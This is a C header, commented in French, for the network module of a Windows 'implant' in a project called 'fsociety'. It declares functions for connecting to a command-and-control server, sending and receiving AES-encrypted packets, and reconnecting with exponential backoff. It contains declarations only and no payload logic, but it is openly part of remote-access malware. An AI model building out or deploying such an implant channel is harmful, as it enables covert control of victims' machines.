#ifndef FSO_COMM_H
#define FSO_COMM_H

#include <stdint.h>
#include <stddef.h>
#include "protocol.h"

/* ============================================================
 * fsociety — Communication côté implant (Windows)
 * ============================================================ */

#define FSO_CONN_TIMEOUT_SEC   10
#define FSO_CONN_RECV_BUF      4096

/* État d'une connexion. */
typedef struct {
    uintptr_t sock;            /* SOCKET Windows (casté) */
    char      host[256];       /* IP ou hostname du C2 */
    uint16_t  port;            /* port du C2 */
    int       connected;       /* 1 si connecté */
} fso_conn_t;

/* ---------- Cycle de vie ---------- */

/* Initialise Winsock. À appeler une fois au démarrage.
 * Retourne 0 en succès, -1 en erreur. */
int fso_conn_init(void);

/* Nettoie Winsock. À appeler à la fin. */
void fso_conn_cleanup(void);

/* Se connecte au C2 `host:port`.
 * Retourne 0 en succès, -1 en erreur. */
int fso_conn_connect(fso_conn_t *conn, const char *host, uint16_t port);

/* Ferme la connexion. */
void fso_conn_close(fso_conn_t *conn);

/* ---------- I/O ---------- */

/* Envoie `len` octets.
 * Retourne le nombre d'octets envoyés, ou -1 en erreur. */
int fso_conn_send(fso_conn_t *conn, const void *buf, size_t len);

/* Reçoit jusqu'à `len` octets.
 * Retourne le nombre d'octets reçus, 0 si déconnexion, -1 en erreur. */
int fso_conn_recv(fso_conn_t *conn, void *buf, size_t len);

/* Envoie un paquet chiffré (payload chiffré avec AES).
 * Retourne 0 en succès, -1 en erreur. */
int fso_conn_send_secure(fso_conn_t *conn, const uint8_t *aes_key,
                         uint8_t type, uint16_t seq_id,
                         const uint8_t *payload, uint32_t payload_len);

/* Reçoit et déchiffre un paquet.
 * Retourne le nombre d'octets déchiffrés, ou -1 en erreur. */
int fso_conn_recv_secure(fso_conn_t *conn, const uint8_t *aes_key,
                         fso_header_t *header_out,
                         uint8_t *payload_out, size_t payload_size);

/* ---------- Reconnexion ---------- */

/* Tente de se reconnecter avec backoff exponentiel.
 * Bloque jusqu'à succès ou abandon.
 * Retourne 0 en succès, -1 en erreur. */
int fso_conn_reconnect(fso_conn_t *conn);

int fso_conn_recv_exact(fso_conn_t *conn, void *buf, size_t len);

#endif /* FSO_COMM_H */